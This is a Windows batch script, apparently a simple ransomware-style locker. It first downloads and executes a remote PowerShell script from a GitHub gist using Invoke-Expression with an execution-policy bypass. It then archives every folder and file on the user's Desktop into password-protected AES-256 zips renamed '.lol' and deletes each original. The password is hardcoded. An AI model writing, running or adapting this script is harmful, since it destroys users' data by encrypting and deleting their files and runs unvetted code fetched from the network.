@echo off
SETLOCAL EnableDelayedExpansion


SET "PASSWORD=test123"
SET "DESKTOP_PATH=%USERPROFILE%\Desktop"


powershell -NoProfile -ExecutionPolicy Bypass -Command "Invoke-Expression (Invoke-WebRequest -UseBasicParsing 'https://gist.githubusercontent.com/SomeCallMeTom/6dd42be6b81fd0c898fa9554b227e4b4/raw/8b8f6e96de7469cea73c9fe63a5da4d44a7c1ba7/Install-7zip.ps1').Content"
SET "SEVEN_ZIP_PATH=C:\Program Files\7-Zip\7z.exe"

FOR /D %%D IN ("%DESKTOP_PATH%\*") DO (
    SET "FOLDER=%%~fD"
    SET "ZIP_NAME=%%~fD.lol"
    IF NOT EXIST "!ZIP_NAME!" (
        ECHO encrypting folder: %%~nxD
        "%SEVEN_ZIP_PATH%" a -tzip -p%PASSWORD% -mem=AES256 "!ZIP_NAME!" "!FOLDER!" >nul
        timeout 1 >nul
        rmdir /s /q "!FOLDER!"
    ) ELSE (
        ECHO Skipping existing: %%~nxD
    )
)


FOR %%F IN ("%DESKTOP_PATH%\*.*") DO (
    IF /I NOT "%%~xF"==".lol" (
        SET "FILE=%%~fF"
        SET "ZIP_NAME=%%~fF.lol"

        IF NOT EXIST "!ZIP_NAME!" (
            ECHO encrypting file: %%~nxF
            "%SEVEN_ZIP_PATH%" a -tzip -p%PASSWORD% -mem=AES256 "!ZIP_NAME!" "!FILE!" >nul
            timeout 1 >nul
            del /q "!FILE!"
        ) ELSE (
            ECHO Skipping existing: %%~nxF
        )
    )
)

ECHO Done encrypting all files and folders with password.
:EndScript
ENDLOCAL
